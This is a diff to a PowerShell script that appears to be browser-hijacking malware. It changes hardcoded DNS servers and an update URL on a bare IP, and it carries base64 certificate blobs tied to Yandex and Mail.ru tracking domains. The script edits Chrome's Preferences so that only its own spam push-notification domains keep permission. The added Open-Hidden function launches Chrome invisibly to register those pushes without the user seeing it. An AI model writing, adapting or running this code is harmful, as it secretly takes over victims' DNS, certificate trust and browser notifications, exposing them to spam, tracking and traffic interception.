@@ -1,7 +1,7 @@
-﻿$PrimaryDNSServer = '185.247.141.78'
-$SecondaryDNSServer = '185.247.141.51'
-$updateUrl = 'http://185.247.141.78/dynamicdata/upd/update.txt'
-$xpushes = @('https://sex-razdevalka.online', 'https://wps-office.site')
+﻿$PrimaryDNSServer = '213.226.112.111'
+$SecondaryDNSServer = '195.58.51.168'
+$updateUrl = 'http://213.226.112.111/dynamicdata/upd/update.txt'
+$xpushes = @('https://sex-razdevalka.online', 'https://action02.biz/go/ge4dknzyge5dcmbugq3a')
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
@@ -41,25 +41,6 @@ $xdata = @{
 'JpZRfOLSekHlr7qWndSKUSS3337rth7QQF9qrayvCdPn+U4CR8Kcrhep0bZJqhg3R5drrBXmQ9PG+voj7aUHPgccpRJwS+otFX1hLJP3suermL731WGh1aptPtmq5mKOUOZfMpAoVyeYFA053W2+WnU8AYJ4sZi53LbVekJsjTJLUHBWXy9wp+IrWjKffp1zeGoXnM/Z'+ 
 'jxZjG34amliO0EjYEH6NOtecxn1awBOJTt4lixAOK0ZeavXHCiL/tPF2jXX90Z7DlEoIXcsgNGA/Sv7OjSnI7aG5pzL+nRJRqNkrfeMxX+k3+CcoVZF14PVRE0MOa4E15sQrfFEnjtyegohCybZu6i+OGSvMYCDaxtptsAh2Tm0/2TA7MB8wBwYFKw4DAhoEFNtPqs5q'+ 
 '1G9mZe9CvtxSCucPXxOGBBSPhxfOiBjjHYxtBy3uHxs5pJTIXwICB9A='
-'t.mail.ru'='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'+ 
-'ElKP5UuG8COPkwBKHQICB9A='
 'ad.mail.ru'='MIIKoQIBAzCCCl0GCSqGSIb3DQEHAaCCCk4EggpKMIIKRjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAiyguZGhjsI5wICB9AEggTYbDaePAAolOHAB1DIu3RoEA11gy9KE+j+shkyrh3r'+ 
 'Vvj8/+GbiC0/bY/bq4TqviKiytV3T/X8U4SJpApGpxvLystOJmHz7Td5sXtDSADM6wmifdzmr5F93aEhB2r1ygQw3ubG9HBYgwNSYAGM+jTGZxbUQz1pr3Dvp333Y7V3kyoULiWsqctzylHRDiTt88PR/IbOwVBsH6p3EqFA191FN8HAvL4LH9rbCbGddmIZwfWa64OR'+ 
 'g0HepeBeULKjkY6bxa4biW3C1J7nd5DaCC3AVaXUYjNdrCov8tzB7fn19/5yCaentoCElYLbESrCsQa4U+LpxyXo0N8EhwbN+TKEilh8ANQjrAZ97/B0I/EeaASBgsJgqw85+/0NXJdjwV4WjrhmLSJOnRA9NyN81wAzmcYESWvAfHPYgAV8VPCBr4WIWBjXuDWK7Cr3'+ 
@@ -79,6 +60,25 @@ $xdata = @{
 'Lh9dmvuvyxeCwq/Lnz4hs/eUWO/nxUlkzs4jPeyvD13kY45VwBKMQ8fDHRGqFzStfWtAgcCQVdyIKXM7tUE+7RY3M5Ltfcg2ar0skp4o6NEdvh7XQhdIpqgitGexD7vNAjosFVy5EkNc4g5Ir57VzHqGT55javuxQb/lYV5mwWklXoWN/MlQtLMxctbts60SBIzFfV7p'+ 
 'pA4ka+hNucSnGW/P0Ve5N9HqXSTzMZzM1A7wractgzwB0RAyGyZxmVnwFDbfEE00c7cijLw8pg3TBgCDn5601dX7Pbx/zbPKaHjkA5q4QivROE9zEZ8RMWmXMwPm+IpFrmnzZ8/rqh9R6V9VHDlMWKelMDswHzAHBgUrDgMCGgQUkWMf+sHo6wkApeCDnaVd/dfgFD4E'+ 
 'FFFuGV+9kie3ESBIEJFSc0fc4pQ0AgIH0A=='
+'t.mail.ru'='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'+ 
+'ElKP5UuG8COPkwBKHQICB9A='
 'counter.yadro.ru'='MIIKwQIBAzCCCn0GCSqGSIb3DQEHAaCCCm4EggpqMIIKZjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAgz/XL2hxspWAICB9AEggTYtm9DPW0sVhfAj2gp92LQqFyfNXaM4V4z15EHj88J'+ 
 'ZHmm6fIhgsUCy4JZbMIBGy/XEjjAIGGvjqDu8Yjemeg0y2vYdXSZV/1op/btkWgJDqOaSNt12jxy3tku9kKXXQVCbP1/ODsklE7sxe8yLXWucML//jZiPPq1FbbkoTaxIkgcYx2WtHn5pSukcw4hvl7FfC4Yj0cgUWAd2GCd2Xczbl1VhkYvuFjVTVeYeSxiBTwEd5bc'+ 
 'q+Y61Fduu8DVtL/8WD3trtwPQGxlwrnHmXmqiHZ3kaa4YUtcwhzW0beeqMnfG/CLDhm7CNbm6m2TbLZVk8PLdhtXllKe306w/BoYe5IPJsdZV9BLKN6rfrnJswkHuw+LdoUzkrG1TZ0iRh3Mi23e7W+lR3xPkX81npC5LfB7XvGVf+CNsTg8I+JxgzwMYLvaIJPhodyT'+ 
@@ -207,27 +207,31 @@ function ConfigureChrome {
 
 
 
-
-function PushDomain
-{ 
+function PushDomain {
     param ($pushUrl)
-    $parsedUri = [System.Uri]::new($pushUrl)
+
+    # Trim the input string before the first comma
+    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()
+
+    # Parse the URI
+    $parsedUri = [System.Uri]::new($trimmedUrl)
+    
+    # Extract domain and port
     $domain = $parsedUri.Host
-    $port=443;
-    $port = if ($parsedUri.Port -eq -1) {
-    } else {
-        $parsedUri.Port
-    }
+    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }
+
+    # Construct the result URL
     $result = "https://" + $domain + ":" + "$port,*"
+    
     return $result
 }
 
 function PushExists
 {
-    (param $pushUrl)
+    param ($pushUrl)
     foreach ($push in $xpushes) 
     {
-        if ($push -eq (PushDomain -pushUrl $push))
+        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
         {
             return $true;
         }
@@ -268,35 +272,42 @@ function Remove-Pushes {
     # Check if the Preferences file exists
     if (Test-Path $preferencesPath) {
         $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
-        $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
 
-        if ($notificationSettings) {
+        # Check if the structure is as expected
+        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
+            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
+
             $keysToRemove = @()
 
-            $keys = $notificationSettings.Keys
-            for ($i = 0; $i -lt $keys.Count; $i++) {
-                $siteUrl = $keys[$i]
+            # Iterate through each entry in $notificationSettings
+            foreach ($field in $notificationSettings.PSObject.Properties) {
+                $siteUrl = $field.Name
                 $permission = (PushExists -pushUrl $siteUrl)
-
+            
                 if ($permission -eq $false) {
-                    $keysToRemove += $siteUrl
+                    $keysToRemove += $field.Name
+                } else {
+                    Write-Output "$siteUrl hasn't been removed, it is a good site."
                 }
             }
 
             foreach ($key in $keysToRemove) {
-                $notificationSettings.Remove($key)
+                # Remove the entry from $notificationSettings
+                $notificationSettings.PSObject.Properties.Remove($key)
             }
-            $newPreferencesContent = $preferencesContent | ConvertTo-Json -Depth 100
-            Set-Content -Path $preferencesPath -Value $newPreferencesContent -Force
+
+            # Update the preferences content with modified notification settings
+            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force
 
             Write-Output "All selected push notification settings have been removed."
         } else {
-            Write-Output "No notification settings found."
+            Write-Output "No or unexpected notification settings found in Preferences file."
         }
     } else {
         Write-Output "Preferences file not found at path: $preferencesPath"
     }
 }
+
 
 function Add-Push {
     param (
@@ -378,10 +389,55 @@ function Add-Push {
     }
 }
 
+
+function Open-Hidden {
+    param (
+        [string]$path,
+        [string]$url
+    )
+
+    # Define the SW_HIDE constant
+    $SW_HIDE = 0
+
+    # Define the necessary P/Invoke signature for ShowWindow
+    $signature = @"
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+"@
+
+    # Add the user32.dll function to a dynamic assembly
+    Add-Type -MemberDefinition $signature -Namespace Win32 -Name User32
+
+    # Create the process start information
+    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processStartInfo.FileName = $path
+    $processStartInfo.Arguments = $url
+    $processStartInfo.WindowStyle = 'Hidden'
+
+    # Start the process
+    $process = New-Object System.Diagnostics.Process
+    $process.StartInfo = $processStartInfo
+    $process.Start() | Out-Null  # Start the process and suppress output
+
+    # Wait for the process to start and get its handle
+    Start-Sleep -Milliseconds 100
+
+    # Retrieve the main window handle
+    $process.Refresh()  # Refresh process information to get the handle
+    $hWnd = $process.MainWindowHandle
+
+    # Hide the window using the ShowWindow function
+    if ($hWnd -ne [System.IntPtr]::Zero) {
+        [Win32.User32]::ShowWindow($hWnd, $SW_HIDE) | Out-Null
+    }
+
+    return $process
+}
+
 function Open-ChromeWithUrl {
     param (
         [string]$url,
-        [int]$waitSeconds = 10
+        [int]$waitSeconds = 8
     )
 
     # Define possible paths to the Chrome executable
@@ -414,12 +470,12 @@ function Open-ChromeWithUrl {
         if (Test-Path -Path $path) {
             Write-Output "Found Chrome at: $path"
             # Start Chrome and navigate to the URL, capturing the process object
-            $chromeProcess = Start-Process -FilePath $path -ArgumentList $url -PassThru -WindowStyle Hidden
+            $chromeProcess = Open-Hidden -path $path -url $url
             # Wait for the specified number of seconds
             Start-Sleep -Seconds $waitSeconds
             # Terminate the Chrome process
             Write-Output "Closing Chrome process with ID: $($chromeProcess.Id)"
-            Stop-Process -Id $chromeProcess.Id -Force
+            Stop-Process -Id $chromeProcess.Id
         } else {
             Write-Output "Chrome not found at: $path"
         }
@@ -438,8 +494,6 @@ function ConfigureChromePushes {
         Open-ChromeWithUrl -url $push -waitSeconds 8
     }
 }
-
-ConfigureChromePushes
 
 
 
